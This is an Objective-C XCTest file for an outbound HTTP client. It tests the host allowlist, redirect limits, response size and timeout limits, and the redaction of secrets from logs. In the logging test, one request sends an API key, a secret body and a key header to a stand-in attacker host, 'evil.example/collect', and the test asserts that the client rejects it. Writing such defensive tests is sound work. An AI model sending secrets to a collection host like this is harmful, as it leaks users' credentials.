#import <Foundation/Foundation.h>
#import <XCTest/XCTest.h>
#import "ALNHTTPClient.h"
#import "ALNLogger.h"
#include <fcntl.h>
#include <unistd.h>

// GitHub issue 99: ALNHTTPClient, an outbound client with a required host
// allowlist, one total deadline, a response size limit and safe redirects.
@interface HTTPClientTests : XCTestCase
@end

@implementation HTTPClientTests {
  NSTask *_peer;
  NSInteger _port;
  NSString *_tracePath;
}

- (void)setUp {
  [super setUp];
  _tracePath = [NSTemporaryDirectory()
      stringByAppendingPathComponent:[NSString stringWithFormat:@"arlen-http-client-%@.trace",
                                                                [[NSUUID UUID] UUIDString]]];
  [[NSFileManager defaultManager] createFileAtPath:_tracePath contents:[NSData data] attributes:nil];
  _peer = [NSTask new];
  _peer.launchPath = @"/usr/bin/env";
  _peer.arguments = @[ @"python3", @"tests/fixtures/http/metadata_server.py", @"--trace", _tracePath ];
  // Sanitizer lanes preload runtimes into xctest; an uninstrumented python
  // child must not inherit them.
  NSMutableDictionary *environment = [[[NSProcessInfo processInfo] environment] mutableCopy];
  [environment removeObjectForKey:@"LD_PRELOAD"];
  _peer.environment = environment;
  NSPipe *output = [NSPipe pipe];
  _peer.standardOutput = output;
  [_peer launch];
  NSMutableData *line = [NSMutableData data];
  while (line.length < 8) {
    NSData *byte = [output.fileHandleForReading readDataOfLength:1];
    if (!byte.length || ((const char *)byte.bytes)[0] == '\n') break;
    [line appendData:byte];
  }
  _port = [[[NSString alloc] initWithData:line encoding:NSUTF8StringEncoding] integerValue];
}

- (void)tearDown {
  [_peer terminate];
  [_peer waitUntilExit];
  [[NSFileManager defaultManager] removeItemAtPath:_tracePath error:nil];
  [super tearDown];
}

- (NSArray<NSString *> *)trace {
  NSString *contents = [NSString stringWithContentsOfFile:_tracePath encoding:NSUTF8StringEncoding error:NULL] ?: @"";
  NSMutableArray *paths = [NSMutableArray array];
  for (NSString *line in [contents componentsSeparatedByString:@"\n"]) {
    if (line.length) [paths addObject:line];
  }
  return paths;
}

- (NSURL *)URLForPath:(NSString *)path {
  return [NSURL URLWithString:[NSString stringWithFormat:@"http://127.0.0.1:%ld%@", (long)_port, path]];
}

- (ALNHTTPClient *)clientWith:(NSDictionary *)extra {
  NSMutableDictionary *configuration = [@{
    @"allowedHosts" : @[ [NSString stringWithFormat:@"127.0.0.1:%ld", (long)_port] ],
    @"allowHTTP" : @YES,
    @"timeoutSeconds" : @5,
  } mutableCopy];
  [configuration addEntriesFromDictionary:extra ?: @{}];
  NSError *error = nil;
  ALNHTTPClient *client = [[ALNHTTPClient alloc] initWithConfiguration:configuration error:&error];
  XCTAssertNotNil(client, @"%@", error);
  return client;
}

- (void)testConfigurationIsValidated {
  NSArray *invalid = @[
    @{},
    @{ @"allowedHosts" : @[] },
    @{ @"allowedHosts" : @"api.example.com" },
    @{ @"allowedHosts" : @[ @"*.example.com" ] },
    @{ @"allowedHosts" : @[ @"https://api.example.com" ] },
    @{ @"allowedHosts" : @[ @"api.example.com:0" ] },
    @{ @"allowedHosts" : @[ @"api.example.com:99999" ] },
    @{ @"allowedHosts" : @[ @"api..example.com" ] },
    @{ @"allowedHosts" : @[ @"api.example.com" ], @"timeoutSeconds" : @0 },
    @{ @"allowedHosts" : @[ @"api.example.com" ], @"timeoutSeconds" : @301 },
    @{ @"allowedHosts" : @[ @"api.example.com" ], @"timeoutSeconds" : @YES },
    @{ @"allowedHosts" : @[ @"api.example.com" ], @"maxResponseBytes" : @0 },
    @{ @"allowedHosts" : @[ @"api.example.com" ], @"maxRedirects" : @11 },
    @{ @"allowedHosts" : @[ @"api.example.com" ], @"allowHTTP" : @"yes" },
    @{ @"allowedHosts" : @[ @"api.example.com" ], @"allowedHost" : @[ @"other.example.com" ] },
  ];
  for (NSDictionary *configuration in invalid) {
    NSError *error = nil;
    XCTAssertNil([[ALNHTTPClient alloc] initWithConfiguration:configuration error:&error], @"%@", configuration);
    XCTAssertEqualObjects(ALNHTTPClientErrorDomain, error.domain);
    XCTAssertEqual(ALNHTTPClientErrorInvalidConfiguration, error.code, @"%@", configuration);
  }
  NSError *error = nil;
  NSDictionary *textValues = @{ @"allowedHosts" : @[ @"API.Example.com", @"hooks.example.com:8443" ],
                                @"timeoutSeconds" : @"30", @"maxResponseBytes" : @"2048", @"maxRedirects" : @"2" };
  ALNHTTPClient *client = [[ALNHTTPClient alloc] initWithConfiguration:textValues error:&error];
  XCTAssertNotNil(client, @"%@", error);
  XCTAssertEqualObjects((@[ @"api.example.com", @"hooks.example.com:8443" ]), client.allowedHosts);
  XCTAssertEqual(30.0, client.timeout);
  XCTAssertEqual((NSUInteger)2048, client.maxResponseBytes);
  XCTAssertEqual((NSUInteger)2, client.maxRedirects);
  XCTAssertFalse(client.allowHTTP);
  client = [[ALNHTTPClient alloc] initWithConfiguration:@{ @"allowedHosts" : @[ @"api.example.com" ] } error:&error];
  XCTAssertEqual(10.0, client.timeout);
  XCTAssertEqual((NSUInteger)1048576, client.maxResponseBytes);
  XCTAssertEqual((NSUInteger)0, client.maxRedirects);
}

- (void)testRequestsOutsideTheAllowlistFailBeforeConnecting {
  XCTAssertTrue(_port > 0);
  ALNHTTPClient *client = [self clientWith:nil];
  NSDictionary *rejected = @{
    [NSString stringWithFormat:@"http://localhost:%ld/ok", (long)_port] : @(ALNHTTPClientErrorHostNotAllowed),
    [NSString stringWithFormat:@"http://127.0.0.1:%ld/ok", (long)_port + 1] : @(ALNHTTPClientErrorHostNotAllowed),
    [NSString stringWithFormat:@"http://user:pass@127.0.0.1:%ld/ok", (long)_port] : @(ALNHTTPClientErrorInvalidRequest),
    [NSString stringWithFormat:@"ftp://127.0.0.1:%ld/ok", (long)_port] : @(ALNHTTPClientErrorInvalidRequest),
  };
  for (NSString *url in rejected) {
    NSError *error = nil;
    XCTAssertNil([client GETURL:[NSURL URLWithString:url] headers:nil error:&error], @"%@", url);
    XCTAssertEqual([rejected[url] integerValue], error.code, @"%@: %@", url, error);
  }
  NSMutableURLRequest *trace = [NSMutableURLRequest requestWithURL:[self URLForPath:@"/ok"]];
  trace.HTTPMethod = @"TRACE";
  NSError *error = nil;
  XCTAssertNil([client performRequest:trace error:&error]);
  XCTAssertEqual(ALNHTTPClientErrorInvalidRequest, error.code);
  // Plain http needs allowHTTP.
  ALNHTTPClient *httpsOnly = [self clientWith:@{ @"allowHTTP" : @NO }];
  XCTAssertNil([httpsOnly GETURL:[self URLForPath:@"/ok"] headers:nil error:&error]);
  XCTAssertEqual(ALNHTTPClientErrorInvalidRequest, error.code);
  XCTAssertEqual((NSUInteger)0, self.trace.count, @"%@", self.trace);
}

- (void)testGETAndPOSTJSON {
  ALNHTTPClient *client = [self clientWith:nil];
  NSError *error = nil;
  ALNHTTPClientResult *result = [client GETURL:[self URLForPath:@"/ok"] headers:nil error:&error];
  XCTAssertNotNil(result, @"%@", error);
  XCTAssertEqual(200, result.response.statusCode);
  result = [client POSTJSONObject:@{ @"ticket" : @42 } toURL:[self URLForPath:@"/echo"]
                          headers:@{ @"X-Request-Source" : @"helpdesk" } error:&error];
  XCTAssertNotNil(result, @"%@", error);
  NSDictionary *echo = [NSJSONSerialization JSONObjectWithData:result.body options:0 error:NULL];
  XCTAssertEqualObjects(@"POST", echo[@"method"]);
  XCTAssertEqualObjects(@"application/json", echo[@"headers"][@"content-type"]);
  XCTAssertEqualObjects(@"helpdesk", echo[@"headers"][@"x-request-source"]);
  NSDictionary *sent = [NSJSONSerialization JSONObjectWithData:[echo[@"body"] dataUsingEncoding:NSUTF8StringEncoding]
                                                       options:0 error:NULL];
  XCTAssertEqualObjects(@42, sent[@"ticket"]);
  // HTTP error statuses are results.
  result = [client GETURL:[self URLForPath:@"/status"] headers:nil error:&error];
  XCTAssertEqual(503, result.response.statusCode);
}

- (void)testRedirectsAreOffByDefaultAndStayOnAllowedHosts {
  NSError *error = nil;
  ALNHTTPClientResult *result = [[self clientWith:nil] GETURL:[self URLForPath:@"/redirect"] headers:nil error:&error];
  XCTAssertEqual(302, result.response.statusCode, @"%@", error);
  XCTAssertTrue(result.stoppedAtRedirectLimit);
  XCTAssertEqualObjects((@[ @"/redirect" ]), self.trace);

  ALNHTTPClient *following = [self clientWith:@{ @"maxRedirects" : @3 }];
  result = [following GETURL:[self URLForPath:@"/redirect"] headers:nil error:&error];
  XCTAssertEqual(200, result.response.statusCode, @"%@", error);
  XCTAssertFalse(result.stoppedAtRedirectLimit);

  // A request carrying a credential is never redirected.
  result = [following GETURL:[self URLForPath:@"/redirect"] headers:@{ @"Authorization" : @"Bearer token" } error:&error];
  XCTAssertEqual(302, result.response.statusCode, @"%@", error);
  XCTAssertTrue(result.stoppedAtRedirectLimit);

  // /cross-origin redirects to localhost, which is not on the allowlist.
  NSUInteger before = self.trace.count;
  XCTAssertNil([following GETURL:[self URLForPath:@"/cross-origin"] headers:nil error:&error]);
  XCTAssertEqual(ALNHTTPClientErrorRedirectNotAllowed, error.code);
  XCTAssertTrue([error.localizedDescription containsString:@"localhost:"], @"%@", error);
  XCTAssertEqualObjects((@[ @"/cross-origin" ]), [self.trace subarrayWithRange:NSMakeRange(before, self.trace.count - before)]);

  XCTAssertNil([following GETURL:[self URLForPath:@"/chain/5"] headers:nil error:&error]);
  XCTAssertEqual(ALNHTTPClientErrorTooManyRedirects, error.code);
}

- (void)testResponseSizeLimitAndTotalDeadline {
  ALNHTTPClient *small = [self clientWith:@{ @"maxResponseBytes" : @16 }];
  for (NSString *path in @[ @"/exact", @"/declared", @"/chunked" ]) {
    NSError *error = nil;
    XCTAssertNil([small GETURL:[self URLForPath:path] headers:nil error:&error], @"%@", path);
    XCTAssertEqual(ALNHTTPClientErrorResponseTooLarge, error.code, @"%@: %@", path, error);
  }
  NSError *error = nil;
  ALNHTTPClientResult *result = [[self clientWith:@{ @"maxResponseBytes" : @32 }] GETURL:[self URLForPath:@"/exact"]
                                                                                 headers:nil error:&error];
  XCTAssertEqual((NSUInteger)32, result.body.length, @"%@", error);

  ALNHTTPClient *quick = [self clientWith:@{ @"timeoutSeconds" : @1 }];
  NSTimeInterval start = [NSDate timeIntervalSinceReferenceDate];
  XCTAssertNil([quick GETURL:[self URLForPath:@"/sleep"] headers:nil error:&error]);
  NSTimeInterval elapsed = [NSDate timeIntervalSinceReferenceDate] - start;
  XCTAssertEqual(ALNHTTPClientErrorTimedOut, error.code, @"%@", error);
  XCTAssertTrue(elapsed >= 0.9 && elapsed < 2.5, @"%f", elapsed);
}

- (void)testErrorsAndLogsNeverCarryCredentialsBodiesOrQueries {
  int fds[2];
  XCTAssertEqual(0, pipe(fds));
  fcntl(fds[0], F_SETFL, fcntl(fds[0], F_GETFL) | O_NONBLOCK);
  ALNLogger *logger = [[ALNLogger alloc] initWithFormat:@"json"];
  logger.minimumLevel = ALNLogLevelInfo;
  logger.outputFileDescriptor = fds[1];
  ALNHTTPClient *client = [self clientWith:@{ @"maxRedirects" : @2 }];
  client.logger = logger;

  // The fixture routes on the full target, so the query rides on the default route.
  NSURL *url = [self URLForPath:@"/ok?api_key=SECRET-QUERY"];
  NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
  request.HTTPMethod = @"POST";
  request.HTTPBody = [@"SECRET-BODY" dataUsingEncoding:NSUTF8StringEncoding];
  [request setValue:@"Bearer SECRET-TOKEN" forHTTPHeaderField:@"Authorization"];
  NSError *error = nil;
  XCTAssertEqual(200, [client performRequest:request error:&error].response.statusCode, @"%@", error);
  request.URL = [self URLForPath:@"/cross-origin"];
  [request setValue:nil forHTTPHeaderField:@"Authorization"];
  [request setValue:@"SECRET-API-KEY" forHTTPHeaderField:@"X-Api-Key"];
  XCTAssertNil([client performRequest:request error:&error]);
  request.URL = [NSURL URLWithString:@"http://evil.example/collect?api_key=SECRET-QUERY"];
  NSError *hostError = nil;
  XCTAssertNil([client performRequest:request error:&hostError]);

  close(fds[1]);
  NSMutableData *data = [NSMutableData data];
  char buffer[4096];
  ssize_t count;
  while ((count = read(fds[0], buffer, sizeof(buffer))) > 0) [data appendBytes:buffer length:(NSUInteger)count];
  close(fds[0]);
  NSString *log = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] ?: @"";

  XCTAssertTrue([log containsString:@"http_client.request"], @"%@", log);
  XCTAssertTrue([log containsString:@"\"path\":\"/ok\""], @"%@", log);
  XCTAssertTrue([log containsString:@"/cross-origin"], @"%@", log);
  for (NSString *text in @[ log, error.localizedDescription ?: @"", hostError.localizedDescription ?: @"" ]) {
    for (NSString *secret in @[ @"SECRET-QUERY", @"SECRET-BODY", @"SECRET-TOKEN", @"SECRET-API-KEY" ]) {
      XCTAssertFalse([text containsString:secret], @"%@ in %@", secret, text);
    }
  }
  XCTAssertEqualObjects(@"Host not allowed: evil.example:80", hostError.localizedDescription);
}

@end
